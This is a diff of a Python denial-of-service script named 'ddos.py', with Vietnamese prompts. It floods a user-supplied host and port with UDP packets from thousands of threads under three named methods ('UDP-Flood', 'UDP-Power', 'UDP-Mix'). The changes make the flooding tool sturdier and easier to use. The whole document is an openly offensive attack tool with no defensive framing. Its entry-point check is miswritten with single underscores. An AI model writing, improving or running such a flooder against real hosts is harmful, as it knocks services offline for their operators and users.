@@ -1,18 +1,22 @@
+
 import sys
 import socket
 import threading
 import time
 
-running = True  # Biến điều khiển vòng lặp
+running = True
 
 def send_packet(host, port, amplifier):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         while running:
-            s.sendto(b"\x99" * amplifier, (host, port))
-            time.sleep(0.01)
-    except Exception as e:
-        print(f"Error: {e}")
+            try:
+                s.sendto(b"\x99" * amplifier, (host, port))
+                time.sleep(0.01)
+            except Exception as e:
+                print(f"Send error: {str(e)}")
+                break
     finally:
         s.close()
 
@@ -20,29 +24,28 @@ def attack():
     global running
     
     if len(sys.argv) < 4:
-        print("Usage: python DDoS.py <host> <port> <method>")
-        print("Methods: UDP-Flood, UDP-Power, UDP-Mix")
+        print("Cách dùng: python ddos.py <ip> <port> <method>")
+        print("Các phương thức: UDP-Flood, UDP-Power, UDP-Mix")
         return
 
     host = sys.argv[1]
     port = int(sys.argv[2])
-    method = sys.argv[3]
+    method = sys.argv[3].upper()
     loops = 10000
 
     methods = {
-        "UDP-Flood": [375],
-        "UDP-Power": [750], 
-        "UDP-Mix": [375, 750]
+        "UDP-FLOOD": [375],
+        "UDP-POWER": [750],
+        "UDP-MIX": [375, 750]
     }
 
     if method not in methods:
-        print("Invalid method!")
+        print("Phương thức không hợp lệ!")
         return
 
-    print(f"Starting attack on {host}:{port} ({method})")
-    print("Type '/thoat' to stop")
+    print(f"Bắt đầu tấn công {host}:{port} ({method})")
+    print("Nhập '/stop' để dừng")
 
-    # Khởi chạy các thread tấn công
     threads = []
     for _ in range(loops):
         for amp in methods[method]:
@@ -53,26 +56,27 @@ def attack():
             )
             t.start()
             threads.append(t)
-        time.sleep(0.05)
+        time.sleep(0.1)
 
-    # Luồng kiểm tra lệnh dừng
-    def check_exit():
+    def check_stop():
         global running
-        while True:
-            cmd = input()
-            if cmd == '/thoat':
+        while running:
+            cmd = input().strip().lower()
+            if cmd == '/stop':
                 running = False
-                print("Stopping attack...")
                 break
     
-    exit_thread = threading.Thread(target=check_exit, daemon=True)
-    exit_thread.start()
+    threading.Thread(target=check_stop, daemon=True).start()
 
-    # Chờ các luồng hoàn thành
-    for t in threads:
-        t.join()
-
-    print("Attack stopped")
+    try:
+        while running:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        running = False
+    
+    print("Đang dừng tất cả kết nối...")
+    time.sleep(2)
+    print("Tấn công đã dừng")
 
 if _name_ == "_main_":
     attack()
